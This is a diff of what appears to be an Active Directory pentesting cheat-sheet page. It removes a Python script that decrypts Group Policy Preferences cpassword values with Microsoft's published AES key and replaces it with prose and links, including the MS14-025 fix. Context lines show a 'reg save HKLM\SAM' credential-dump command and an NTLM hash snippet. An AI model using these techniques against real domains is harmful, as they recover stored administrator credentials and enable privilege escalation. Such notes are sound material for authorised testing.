@@ -445,42 +445,13 @@ foreach($user in $DomainAdmins) { echo &quot;$($user.displayname) ($($user.samac
 </code></pre>
 
 <h3 id="decrypt-gpo-with-cpassword">Decrypt GPO with cpassword</h3>
-<pre><code class="language-python line-numbers">#!/usr/bin/python
-
-import sys
-import binascii
-
-from Crypto.Cipher import AES
-from base64 import b64decode
-
-unpad = lambda s: s[:-1 * ord(s[-1])]
-
-def decrypt(cpassword):
-    # Init the key
-    # From MSDN: http://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be%28v=PROT.13%29#endNote2
-    key = binascii.unhexlify(&quot;4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b&quot;)
-
-    # Add padding to the base64 string and decode it
-    cpassword += &quot;=&quot; * ((4 - len(cpassword) % 4) % 4)
-    password = b64decode(cpassword)
-    o = AES.new(key, AES.MODE_CBC, &quot;\x00&quot; * 16).decrypt(password)
-
-    return unpad(o).decode(&quot;utf16&quot;)
-
-def main():
-    if len(sys.argv) != 2:
-        print(&quot;Usage: gpprefdecrypt.py &lt;cpassword&gt;&quot;)
-        sys.exit(0)
-
-    cpassword = sys.argv[1]
-    o = decrypt(cpassword)
-
-    print o
-
-if __name__ == &quot;__main__&quot;:
-    main()
-</code></pre>
-
+<p>Some <code>Group Policy Preferences</code> (GPP) GPO stored at <code>\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\Policies\</code>
+contains an account credentials for administration on a remote host.
+The credentials are encrypted using a <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN" target="_blank">static AES key provided by Microsoft</a>.
+A domain user can access the GPP XML files on read the encrypted password. To
+get the clear text credentials the <a href="../assets/cpassword.py">Python script can be used</a>.</p>
+<p>This <a href="https://adsecurity.org/?p=2288" target="_blank">article on AdSecurity</a> presents other tools
+and the protection (<a href="https://support.microsoft.com/en-us/help/2962486/ms14-025-vulnerability-in-group-policy-preferences-could-allow-elevati" target="_blank">KB2962486</a>).</p>
 <h3 id="use-win32-api-in-python">Use Win32 API in Python</h3>
 <p>Download then install the pip package <code>pywin32</code> here: <a href="https://www.lfd.uci.edu/~gohlke/pythonlibs/#pywin32" target="_blank">https://www.lfd.uci.edu/~gohlke/pythonlibs/#pywin32</a></p>
 <h3 id="get-ntp-configuration-server">Get NTP configuration server</h3>
@@ -519,7 +490,7 @@ $ reg save HKLM\SAM SamBkup.hiv
 <h3 id="calculate-ntlm-hash">Calculate NTLM hash</h3>
 <pre><code class="language-python line-numbers">import hashlib
 pwd = &quot;password&quot;
-print(hashlib.new('md4', f'{pwd}'.encode('utf-16le')).hexdigest())
+print(hashlib.new('md4', pwd.encode('utf-16le')).hexdigest())
 </code></pre>
 
 <h3 id="list-email-aliases">List Email aliases</h3>
